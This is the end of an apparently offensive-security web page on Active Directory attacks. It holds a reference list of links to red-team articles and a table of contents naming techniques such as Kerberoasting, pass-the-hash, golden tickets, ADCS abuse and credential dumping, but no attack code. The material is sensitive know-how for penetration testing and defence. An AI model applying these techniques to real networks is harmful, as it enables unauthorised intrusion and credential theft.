<li><a href="https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa">Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher</a></li>
<li><a href="https://hausec.com/2017/10/26/using-bloodhound-to-map-the-user-network/">Using bloodhound to map the user network - Hausec</a></li>
<li><a href="https://morgansimonsen.com/2012/05/21/whats-special-about-the-builtin-administrator-account-12/">WHAT’S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN</a></li>
<li><a href="https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/">WONKACHALL AKERVA NDH2018 – WRITE UP PART 1</a></li>
<li><a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/">WONKACHALL AKERVA NDH2018 – WRITE UP PART 2</a></li>
<li><a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/">WONKACHALL AKERVA NDH2018 – WRITE UP PART 3</a></li>
<li><a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/">WONKACHALL AKERVA NDH2018 – WRITE UP PART 4</a></li>
<li><a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/">WONKACHALL AKERVA NDH2018 – WRITE UP PART 5</a></li>
<li><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami</a></li>
<li><a href="http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/">[PrivExchange] From user to domain admin in less than 60sec ! - davy</a></li>
<li><a href="http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y</a></li>
<li><a href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/">Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY PÉREZ</a></li>
<li><a href="https://adsecurity.org/?p=3592">Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory -  Sean Metcalf</a></li>
<li><a href="https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/">All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018</a></li>
<li><a href="https://www.blackhat.com/presentations/bh-europe-09/Bouillon/BlackHat-Europe-09-Bouillon-Taming-the-Beast-Kerberous-slides.pdf">Taming the Beast Assess Kerberos-Protected Networks - Emmanuel Bouillon</a></li>
<li><a href="https://www.secureauth.com/blog/playing-relayed-credentials">Playing with Relayed Credentials - June 27, 2018</a></li>
<li><a href="https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/">Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema</a></li>
<li><a href="https://blog.preempt.com/drop-the-mic">Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019</a></li>
<li><a href="https:/www.sqlshack.com/build-sql-server-virtual-lab-automatedlab-hyper-v/">How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous</a></li>
<li><a href="pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">SMB Share – SCF File Attacks - December 13, 2017 - @netbiosX</a></li>
<li><a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema</a></li>
<li><a href="https://wald0.com/?p=179">A Red Teamer’s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0</a></li>
<li><a href="https://www.dropbox.com/s/ilzjtlo0vbyu1u0/Carlos%20Garcia%20-%20Rooted2019%20-%20Pentesting%20Active%20Directory%20Forests%20public.pdf?dl=0">Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf</a></li>
<li><a href="https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61">Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10</a></li>
<li><a href="https://github.com/buftas/Active-Directory-Exploitation-Cheat-Sheet#local-privilege-escalation">Active-Directory-Exploitation-Cheat-Sheet - @buftas</a></li>
<li><a href="https://rastamouse.me/2019/01/gpo-abuse-part-1/">GPO Abuse - Part 1 - RastaMouse - 6 January 2019</a></li>
<li><a href="https://rastamouse.me/2019/01/gpo-abuse-part-2/">GPO Abuse - Part 2 - RastaMouse - 13 January 2019</a></li>
<li><a href="https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/">Abusing GPO Permissions - harmj0y - March 17, 2016</a></li>
<li><a href="https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html">How To Attack Kerberos 101 - m0chan - July 31, 2019</a></li>
<li><a href="https://sensepost.com/blog/2020/ace-to-rce/">ACE to RCE - @JustinPerdok - July 24, 2020</a></li>
<li><a href="https://www.secura.com/pathtoimg.php?id=2055">Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020</a></li>
<li><a href="https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-aces">Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs</a></li>
<li><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/">CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation - Jake Karnes - December 8th, 2020</a></li>
<li><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/">CVE-2020-17049: Kerberos Bronze Bit Attack – Theory - Jake Karnes - December 8th, 2020</a></li>
<li><a href="https://www.hub.trimarcsecurity.com/post/leveraging-the-kerberos-bronze-bit-attack-cve-2020-17049-scenarios-to-compromise-active-directory">Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory</a></li>
<li><a href="https://pentestmag.com/gpo-abuse-you-cant-see-me/">GPO Abuse: &ldquo;You can&rsquo;t see me&rdquo; - Huy Kha -  July 19, 2019</a></li>
<li><a href="https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/">Lateral movement via dcom: round 2 - enigma0x3 - January 23, 2017</a></li>
<li><a href="https://www.cybereason.com/blog/dcom-lateral-movement-techniques">New lateral movement techniques abuse DCOM technology - Philip Tsukerman - Jan 25, 2018</a></li>
<li><a href="https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html">Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell</a></li>
<li><a href="https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/">AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev</a></li>
<li><a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17</a></li>
<li><a href="https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html">Playing with PrintNightmare - 0xdf - Jul 8, 2021</a></li>
<li><a href="https://zer1t0.gitlab.io/posts/attacking_ad/">Attacking Active Directory: 0 to 0.9 - Eloy Pérez González - 2021/05/29</a></li>
<li><a href="https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/">Microsoft ADCS – Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021</a></li>
<li><a href="http://www.harmj0y.net/blog/activedirectory/certified-pre-owned/">Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021</a></li>
<li><a href="https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/">NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema</a></li>
<li><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Certified-Pre-Owned-Abusing-Active-Directory-Certificate-Services.pdf">Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_</a></li>
<li><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">Certified Pre-Owned - Will Schroeder - Jun 17 2021</a></li>
<li><a href="https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/">AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021</a></li>
<li><a href="https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb">NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash">UnPAC the hash - The Hacker Recipes</a></li>
<li><a href="https://pentestlab.blog/2021/10/20/lateral-movement-webclient/">Lateral Movement – WebClient</a></li>
<li><a href="https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition">Shadow Credentials: Workstation Takeover Edition - Matthew Creel</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates">Certificate templates - The Hacker Recipes</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/ad-cs/ca-configuration">CA configuration - The Hacker Recipes</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/ad-cs/access-controls">Access controls - The Hacker Recipes</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/ad-cs/web-endpoints">Web endpoints - The Hacker Recipes</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing">sAMAccountName spoofing - The Hacker Recipes</a></li>
<li><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">CVE-2021-42287/CVE-2021-42278 Weaponisation - @exploitph</a></li>
<li><a href="https://www.fortalicesolutions.com/posts/adcs-playing-with-esc4">ADCS: Playing with ESC4 - Matthew Creel</a></li>
<li><a href="https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/">The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo</a></li>
<li><a href="https://www.blackarrow.net/adcs-weaponizing-esc7-attack/">AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022</a></li>
<li><a href="https://www.blackarrow.net/ad-cs-from-manageca-to-rce/">AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Martínez, Kurosh Dabbagh</a></li>
<li><a href="https://www.semperis.com/blog/golden-gmsa-attack/">Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022</a></li>
<li><a href="https://labs.nettitude.com/blog/introducing-malsccm/">Introducing MalSCCM - Phil Keeble -May 4, 2022</a></li>
<li><a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) - Oliver Lyak</a></li>
<li><a href="https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html">bloodyAD and CVE-2022-26923 - soka - 11 May 2022</a></li>
<li><a href="https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/">DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe</a></li>
<li><a href="http://www.labofapenetrationtester.com/2019/04/abusing-PAM.html">How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil SamratAshok Mittal</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials">Shadow Credentials - The Hacker Recipes</a></li>
<li><a href="https://rzander.azurewebsites.net/network-access-accounts-are-evil/">Network Access Accounts are evil… - ROGER ZANDER - 13 SEP 2015</a></li>
<li><a href="https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9">The Phantom Credentials of SCCM: Why the NAA Won’t Die - Duane Michael - Jun 28</a></li>
</ul>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">


  <div><a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/commit/633de932162ed4050c871c15354fc36772f76c3c" title='Last modified by Stuart Gray | February 20, 2023' target="_blank" rel="noopener">
      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
      <span>February 20, 2023</span>
    </a>
  </div>




</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
    <aside class="book-toc">
      <div class="book-toc-content">
        
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#active-directory-attacks">Active Directory Attacks</a>
      <ul>
        <li><a href="#tools">Tools</a></li>
        <li><a href="#active-directory-recon">Active Directory Recon</a>
          <ul>
            <li><a href="#using-bloodhound">Using BloodHound</a></li>
            <li><a href="#using-powerview">Using PowerView</a></li>
            <li><a href="#using-ad-module">Using AD Module</a></li>
            <li><a href="#other-interesting-commands">Other Interesting Commands</a></li>
          </ul>
        </li>
        <li><a href="#most-common-paths-to-ad-compromise">Most common paths to AD compromise</a>
          <ul>
            <li><a href="#ms14-068-microsoft-kerberos-checksum-validation-vulnerability">MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)</a></li>
            <li><a href="#from-cve-to-system-shell-on-dc">From CVE to SYSTEM shell on DC</a></li>
            <li><a href="#open-shares">Open Shares</a></li>
            <li><a href="#scf-and-url-file-attack-against-writeable-share">SCF and URL file attack against writeable share</a></li>
            <li><a href="#passwords-in-sysvol--group-policy-preferences">Passwords in SYSVOL &amp; Group Policy Preferences</a></li>
            <li><a href="#exploit-group-policy-objects-gpo">Exploit Group Policy Objects GPO</a></li>
            <li><a href="#dumping-ad-domain-credentials">Dumping AD Domain Credentials</a></li>
            <li><a href="#user-hunting">User Hunting</a></li>
            <li><a href="#password-spraying">Password spraying</a></li>
            <li><a href="#password-in-ad-user-comment">Password in AD User comment</a></li>
            <li><a href="#password-of-pre-created-computer-account">Password of Pre-Created Computer Account</a></li>
            <li><a href="#reading-laps-password">Reading LAPS Password</a></li>
            <li><a href="#reading-gmsa-password">Reading GMSA Password</a></li>
            <li><a href="#forging-golden-gmsa">Forging Golden GMSA</a></li>
            <li><a href="#pass-the-ticket-golden-tickets">Pass-the-Ticket Golden Tickets</a></li>
            <li><a href="#pass-the-ticket-silver-tickets">Pass-the-Ticket Silver Tickets</a></li>
            <li><a href="#kerberoasting">Kerberoasting</a></li>
            <li><a href="#krb_as_rep-roasting">KRB_AS_REP Roasting</a></li>
            <li><a href="#pass-the-hash">Pass-the-Hash</a></li>
            <li><a href="#overpass-the-hash-pass-the-key">OverPass-the-Hash (pass the key)</a></li>
            <li><a href="#capturing-and-cracking-net-ntlmv1ntlmv1-hashes">Capturing and cracking Net-NTLMv1/NTLMv1 hashes</a></li>
            <li><a href="#capturing-and-cracking-net-ntlmv2ntlmv2-hashes">Capturing and cracking Net-NTLMv2/NTLMv2 hashes</a></li>
            <li><a href="#man-in-the-middle-attacks--relaying">Man-in-the-Middle attacks &amp; relaying</a></li>
            <li><a href="#active-directory-certificate-services">Active Directory Certificate Services</a></li>
            <li><a href="#unpac-the-hash">UnPAC The Hash</a></li>
            <li><a href="#shadow-credentials">Shadow Credentials</a></li>
            <li><a href="#dangerous-built-in-groups-usage">Dangerous Built-in Groups Usage</a></li>
            <li><a href="#abusing-dns-admins-group">Abusing DNS Admins Group</a></li>
            <li><a href="#active-directory-groupsactive-directory-groups"><a href="#active-directory-groups">Active Directory Groups</a></a></li>
            <li><a href="#abusing-active-directory-aclsaces">Abusing Active Directory ACLs/ACEs</a></li>
            <li><a href="#dcom-exploitation">DCOM Exploitation</a></li>
            <li><a href="#trust-relationship-between-domains">Trust relationship between domains</a></li>
            <li><a href="#child-domain-to-forest-compromise---sid-hijacking">Child Domain to Forest Compromise - SID Hijacking</a></li>
            <li><a href="#forest-to-forest-compromise---trust-ticket">Forest to Forest Compromise - Trust Ticket</a></li>
            <li><a href="#privileged-access-management-pam-trust">Privileged Access Management (PAM) Trust</a></li>
            <li><a href="#kerberos-unconstrained-delegation">Kerberos Unconstrained Delegation</a></li>
            <li><a href="#kerberos-constrained-delegation">Kerberos Constrained Delegation</a></li>
            <li><a href="#kerberos-resource-based-constrained-delegation">Kerberos Resource Based Constrained Delegation</a></li>
            <li><a href="#kerberos-bronze-bit-attack---cve-2020-17049">Kerberos Bronze Bit Attack - CVE-2020-17049</a></li>
            <li><a href="#privexchange-attack">PrivExchange attack</a></li>
            <li><a href="#sccm-deployment">SCCM Deployment</a></li>
            <li><a href="#sccm-network-access-accounts">SCCM Network Access Accounts</a></li>
            <li><a href="#wsus-deployment">WSUS Deployment</a></li>
            <li><a href="#rodc---read-only-domain-controller-compromise">RODC - Read Only Domain Controller Compromise</a></li>
            <li><a href="#pxe-boot-image-attack">PXE Boot image attack</a></li>
            <li><a href="#dns-reconnaissance">DNS Reconnaissance</a></li>
            <li><a href="#dsrm-credentials">DSRM Credentials</a></li>
            <li><a href="#impersonating-office-365-users-on-azure-ad-connect">Impersonating Office 365 Users on Azure AD Connect</a></li>
          </ul>
        </li>
        <li><a href="#linux-active-directory">Linux Active Directory</a>
          <ul>
            <li><a href="#ccache-ticket-reuse-from-tmp">CCACHE ticket reuse from /tmp</a></li>
            <li><a href="#ccache-ticket-reuse-from-keyring">CCACHE ticket reuse from keyring</a></li>
            <li><a href="#ccache-ticket-reuse-from-sssd-kcm">CCACHE ticket reuse from SSSD KCM</a></li>
            <li><a href="#ccache-ticket-reuse-from-keytab">CCACHE ticket reuse from keytab</a></li>
            <li><a href="#extract-accounts-from-etckrb5keytab">Extract accounts from /etc/krb5.keytab</a></li>
          </ul>
        </li>
        <li><a href="#references">References</a></li>
      </ul>
    </li>
  </ul>
</nav>


 
      </div>
    </aside>
    
  </main>

  
</body>
</html>












